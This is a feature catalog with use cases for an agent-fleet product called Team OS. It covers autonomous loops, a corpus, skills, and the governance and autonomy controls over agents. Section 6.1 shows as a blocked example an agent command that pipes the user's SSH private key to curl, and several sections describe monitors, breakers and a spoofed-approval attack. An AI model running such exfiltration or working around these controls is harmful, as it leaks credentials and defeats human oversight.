**`v0.1 — 2026-07-13`** *(REFERENCE — functional feature catalog + use cases for Team OS. Not governing. Status tags: **[Built]** = implemented in the fork (FK1–FK8, tested in CI); **[Vision]** = specified in `team-os-emergence-architecture.md`, not yet scoped to build; **[Built+Vision]** = core exists, extension is vision.)*

# Team OS — Functional Features & Use Cases

Recurring personas: **Maya** (staff engineer), **Devin** (PM), **Priya** (on-call SRE), **Sam** (team lead), **Alex** (new hire / collaborator).

---

## 1. Onboarding & compilation (cold start)

### 1.1 Footprint compiler **[Built]**
Reads your eligible work history and compiles it into a **job graph** (recurring tasks), a **profile** (from your CLAUDE.md), and **starter skills** (from your commands). Imperative/injected content is quarantined; raw ingest is distilled then discarded.
- *Maya installs Team OS.* It reads her `~/.claude` footprint and last quarter's artifacts, and produces a job graph showing she writes a weekly digest, a standup, and release notes on a cadence — without her listing any of it.
- *Sam evaluates the tool.* The compiler surfaces the *actual* recurring work of his role from history, so the value is visible in minutes, not after weeks of configuration.

### 1.2 Day One Brief **[Built]**
The first deliverable, unrequested. Within the hour of setup it delivers a Slack DM: the recurring work found, a **job draft you accept line-by-line** with a ✓/✗ reaction, and a first sample deliverable.
- *Maya gets a DM the same afternoon* listing five recurring tasks; she ✓'s four, ✗'s one. The ✗ instantly narrows scope; the four become her standing loops.
- *Cold-start proof:* value before any manual setup — the "< 1 hour, < 40% correction" thesis.

### 1.3 Onboarding CLI & health check **[Built]**
`teamos doctor / compile / brief / loop / verify` — a guided path to stand up the compiler, brief, and loops before the kit automates it. `doctor` confirms the gate is active.
- *Alex joins the team* and runs `teamos doctor` to confirm the gate is live and the hooks reviewed before anything runs.

---

## 2. Proactive work (the initiative)

### 2.1 Autonomous loops **[Built]**
Recurring deliverables (weekly digest, standup, status update, meeting summary, release notes) are **drafted on their own cadence, unprompted**. Runs are checkpointed — a mid-run kill resumes.
- *Every Monday 9am* Maya's weekly digest is drafted and waiting; she edits two lines and sends. The loop fired on the world's schedule, not hers.
- *Priya is paged at 3am.* The incident-adjacent status update is draft-ready when she surfaces, so the write-up doesn't start from a blank page.

### 2.2 Recommendations (agent → user) **[Built]**
Agents propose **actions** to you — schedule this, link that entity, add a review step — each with a rationale and confidence. They never act on their own; they wait for Accept.
- *The scout notices* "nightly corpus compile" has run three weeks straight and recommends promoting it to a scheduled task; Sam accepts with one click.

### 2.3 Insights & discovery **[Built]**
The discovery scout watches what recurs and what improves, then proposes a **new skill**, an improvement, or a pattern. Nothing is created until you accept.
- *Devin's meetings keep producing the same decision-log shape.* The scout proposes a "meeting-summary" skill; Devin approves and it's role-ready next meeting.

---

## 3. Knowledge & corpus

### 3.1 Files-as-truth corpus **[Built]**
Corpus, skills, profile, templates are **plain markdown in git**. Databases and indexes are derived and rebuildable, never authoritative. Backlinks and topology are computed on load.
- *Maya greps the corpus* like any repo; nothing is trapped in a proprietary store.

### 3.2 Lineage on every write **[Built]**
Every corpus/memory write carries **source, evidence, transformation, confidence**. An unlabelled write is rejected by construction.
- *Sam asks "where did this claim come from?"* and the lineage ledger answers with the exact source and transformation — no guessing.

### 3.3 Researcher (specialized agent) **[Built]**
Answers questions across eligible sources, **verified and cited** into the corpus.
- *Devin asks for a queue-vendor comparison.* The researcher gathers across allowed sources, cites each claim, and writes a corpus entry others can reuse.

---

## 4. Skills & learning

### 4.1 Skill registry (versioned) **[Built]**
Skills are versioned artifacts; git is the version ledger (L6). Each has a capability manifest and evidence links.
- *Maya's "release-notes" skill* has a visible version history; every change is attributable.

### 4.2 Learning: signals → scores → versions **[Built]**
Human signals (L8) become quality **scores** (L7) keyed to skill **versions** (L6). You watch a skill's quality climb version over version.
- *Sam sees the "standup" skill* rise from 0.62 to 0.85 across three versions — proof the agent is getting better, not just busier.

### 4.3 Role templates **[Built]**
A role template is the **provisioning unit**: instantiate Engineer / PM / On-call and a new member's agent starts role-ready with the specialized skills + knowledge, no ramp.
- *Alex is hired.* Sam instantiates the "Engineer" template; Alex's agent starts with code-review and release-notes skills already loaded.

### 4.4 Specialized agents **[Built]**
Common roles ship as agents — **code reviewer** (bugs/security/convention drift on PRs), **researcher** (cited answers) — sharing skills, directly addressable, same gates.
- *Maya opens a PR.* The code reviewer posts a review flagging a cache-path bug before a human looks.

---

## 5. Agents & fleet

### 5.1 Fleet dashboard **[Built]**
Every agent at a glance — status, tasks done, acceptance %, quality, subagents, health — plus a **per-agent profile** (role, jobs, live tasks, automation trigger, performance metrics).
- *Sam opens the Agents tab* and sees which agents are working, their acceptance rates, and a "Fleet halted" banner the moment the breaker trips.

### 5.2 Subagent spawning (auditable) **[Built]**
Any agent spins up subagents as the work needs — every spawn is **ledgered, depth-bounded, rate-bounded, chain-verified**.
- *The loops agent* spins up a draft-worker and a format-checker for the weekly digest; both spawns appear in the audit with depth and parent.

### 5.3 Operator console (14 surfaces) **[Built]**
One self-contained console: Overview, Insights, Recommendations, Learning, Agents, Activity, Brief, Inbox, Corpus, Skills, Templates, Envelope, Safety, Audit — all derived from the ledgers, rebuildable.
- *Sam runs the whole team's agent operation* from one page, read-only, files remaining the source of truth.

---

## 6. Governance & safety

### 6.1 Payload gate **[Built]**
A PreToolUse hook inspects the **payload of every tool call** — not just the name: egress scan, sensitive-read scan, cloud-synced-write-as-send, mandatory outbound-content scan. ≤300 lines, human-reviewable, no model, no network.
- *An agent's Bash command* tries to `cat ~/.ssh/id_rsa | curl …`; the gate denies it and ledgers why.
- *A write into a cloud-synced folder* is treated as a send and content-scanned before it leaves.

### 6.2 Ten hash-chained ledgers **[Built]**
Every decision, write, and signal is recorded in append-only, hash-chained JSONL. A mutated record breaks the chain; absence of a record for an executed act is itself the tamper signal.
- *An auditor asks "prove nothing was altered."* `teamos verify` walks every chain end-to-end.

### 6.3 Circuit breaker + safety agent **[Built]**
A deterministic safety agent monitors denial / rejection / spawn rates and **trips a breaker** on threshold breach. Open = every side-effect denied fleet-wide; reads still pass. Only a human resets. The safety agent can only halt, never widen.
- *A bad connector window* spikes gate denials; the safety agent trips the breaker and the fleet halts until Sam reviews and resets.

### 6.4 Integrity verification **[Built]**
`teamos verify` checks every ledger chain. Used in CI and on demand.
- *Before a board review,* Sam runs verify to show the record is intact.

### 6.5 No-individuation surfaces **[Built]**
Dashboards render **per-skill, never person-vs-person**. Enforced by an audit that scans the render code itself.
- *HR asks for a per-person ranking.* The tool cannot produce one; the surface renders per-skill by construction.

---

## 7. Autonomy & control

### 7.1 Autonomy envelope (earned trust) **[Built]**
Autonomy starts narrow and **widens slowly on your authenticated ✓, narrows instantly on a ✗**. Category ceilings the envelope can never raise itself. This is proportional governance — trust per boundary, not uniform.
- *Maya ✓'s the digest for three weeks.* The envelope widens one level so it sends without asking; one bad ✗ snaps it back.

### 7.2 Authenticated acceptance (CN-1) **[Built]**
Only the principal's **verified identity** counts a ✓. A forged reaction can never widen autonomy — the one third-party attack chain's control.
- *A spoofed reaction* tries to expand an agent's scope; it's unattributed, so it's ignored.

### 7.3 Deny-by-default boundary & allow policy **[Vision]**
Irreversible acts (send/delete/spend/disclose) are **denied unless explicitly permitted** — an allowlist, not a harm-blocklist — governed by a user-owned, editable policy file. Default empty = every irreversible act needs human confirmation. Deterministic, model-free.
- *An agent drafts 200 outbound emails.* None send until the pattern is on Maya's allow policy or she confirms — cheap, fragmented harm can't slip through because each irreversible act needs permission.

### 7.4 Stop-rules (guardian behavior) **[Vision]**
The user's policy also has a **stop side**: goals and tripwires — "if the agent deviates from goal G, halt" — enforced by the concern detector / safety agent tripping the breaker. Principle: *deterministic about permitting, semantic about stopping.*
- *Sam writes "stop if an agent starts editing production config."* The moment a trail drifts that way, the breaker trips.

### 7.5 Auto-approve modes **[Vision]**
Three user-chosen modes: **Review** (default — approve each graduation), **auto-approve interior** (reversible work graduates automatically; boundary still deny-by-default), **auto-approve all** (full autonomy within cost ceilings). Observability and the boundary hold in every mode.
- *Priya, mid-incident, flips auto-approve-interior* so drafts flow without prompts, while sends still wait for her.

---

## 8. Collaboration & transfer (the fabric)

### 8.1 Skill transfer / promotion gate **[Built]**
A proven skill is promoted to the **team registry** through a signed gate — PII scan + eval floor + reviewed diff — where a teammate's agent picks it up.
- *Maya's "release-notes" skill* is measurably good; it's promoted, and Alex's agent inherits it without Alex writing it. This is the whitespace — what one agent learns, the team gets.

### 8.2 Default-deny sharing **[Built]**
Nothing leaves personal scope except through the promotion gate (PR + CI). Personal stays personal until deliberately shared.
- *Devin's private drafts* never reach the team registry until he promotes them.

### 8.3 Cross-person knowledge (emergent) **[Vision]**
At density, the corpus can hold conclusions **no single person wrote**, assembled from many labeled contributions — surfaced by the Observatory as candidates.
- *A cluster forms* across five people's entries that no one filed together — an implicit project the Observatory names for Sam to review.

---

## 9. Sources & connectors

### 9.1 Policy-neutral connectors **[Built]**
Sources are **opt-in, off by default**; DMs/email need an explicit, ledgered toggle. The allowlist ships empty of opinion — it holds the user's/org's rule, and the tool enforces whatever it says.
- *Sam's org bans a source.* Team OS enforces the ban; it never adds a source the config didn't, never refuses one it did.

### 9.2 Owned inference (Plane A) **[Built]**
Connectors run on inference **the user owns** — an API key or a local model — independent of, and able to **exclude, the Claude account**. Three credential domains, never mixed.
- *Maya runs the loops on a local model* so no source data touches her Claude account.

---

## 10. Privacy, deletion & exit

### 10.1 Per-principal encryption **[Built]**
Each principal's store is encrypted with a key kept **outside the repo**. No one else can read it; any read lands in the owner's access feed.
- *Alex's personal store* is unreadable to teammates, including Sam.

### 10.2 Deletion propagation **[Built]**
Erasure walks the lineage DAG and is proven to work **before** any colleague data is ingested.
- *A source is revoked.* Deletion propagates to everything derived from it.

### 10.3 Key-destruction erasure (right to be forgotten) **[Vision]**
Delete = **destroy the per-subject encryption key**. The append-only chain is never rewritten (structure/tombstone survives); the content becomes permanently unreadable. Per-subject granularity; propagates to derivatives carrying personal data.
- *Alex exercises erasure.* His content becomes unrecoverable while the structural record (that an entry existed and was deleted) remains — GDPR-satisfiable without breaking the chain.

### 10.4 Exit = clone **[Built]**
Leave with `git clone` and you hold everything in your decryptable scope plus shared artifacts you're keyed for. Nothing traps you.
- *Maya leaves the company.* She clones her scope and walks; shared skills stay with the team; her encrypted store leaves unreadable to others.

---

## 11. Interfaces

### 11.1 MCP door **[Built]**
Read tools + `propose_*` tools over MCP. Reads are read-only; proposals land in an **inbox, never the corpus**; a deterministic gate processor is the only writer.
- *From inside Claude,* Devin browses the corpus and files a proposal; it queues for the gate, never writing his store directly.

### 11.2 Launch site & docs **[Built]**
Self-contained HTML launch site (thesis, architecture, agents, autonomy, workflows, use cases, trust, install) + install/onboarding docs.
- *A prospect* reads the one-page site and understands the product without a demo.

---

## 12. Emergence (vision layer)

### 12.1 Autocatalytic trails **[Vision]**
Agents leave typed marks in the shared store; reused marks **strengthen** (compounding), unused ones fade (archived, not destroyed). Unplanned coordination emerges from local reinforcement — no orchestrator.
- *Over weeks,* a division of labor settles among agents that no one assigned, visible and revertible.

### 12.2 The Observatory (discovery + curation) **[Vision]**
A read-only surface that studies emergence and curates the allowlist. Two advisors: a **curiosity detector** (surface the novel) and a **concern detector** (surface the worrying, and trip the breaker per stop-rules). They propose; a human disposes.
- *Sam reviews a weekly Observatory digest* of what the system figured out that no one told it — each item a candidate to promote, watch, or unwind.

### 12.3 The one falsifiable guarantee **[Vision]**
*No irreversible action ever occurs without an allow-policy match or a human confirmation, and every one has a pre-act ledger record.* A deployment that violates it is a bug, not a residual — the doc's one testable safety commitment.
- *An auditor tests it directly:* find any irreversible act lacking a permit or a pre-act record. If none exists, the guarantee holds.

---

## Feature status summary

| Area | Built | Vision |
|---|---|---|
| Onboarding & compilation | compiler, Day One Brief, CLI | — |
| Proactive work | loops, recommendations, insights | — |
| Knowledge & corpus | files-as-truth, lineage, researcher | cross-person emergent knowledge |
| Skills & learning | registry, L8→L7→L6, templates, specialized agents | — |
| Agents & fleet | fleet dashboard, subagents, console | — |
| Governance & safety | payload gate, ledgers, breaker+safety agent, verify, no-individuation | — |
| Autonomy & control | envelope, authenticated acceptance | deny-by-default, stop-rules, auto-approve modes |
| Collaboration & transfer | promotion gate, default-deny | emergent cross-person knowledge |
| Sources | policy-neutral connectors, owned inference | — |
| Privacy & exit | per-principal encryption, deletion propagation, exit=clone | key-destruction erasure |
| Interfaces | MCP door, launch site/docs | — |
| Emergence | — | trails, Observatory, falsifiable guarantee |

*Built = FK1–FK8, tested in CI. Vision = `team-os-emergence-architecture.md` (v0.7), not yet scoped to build. See also `positioning-vs-landscape.md`.*
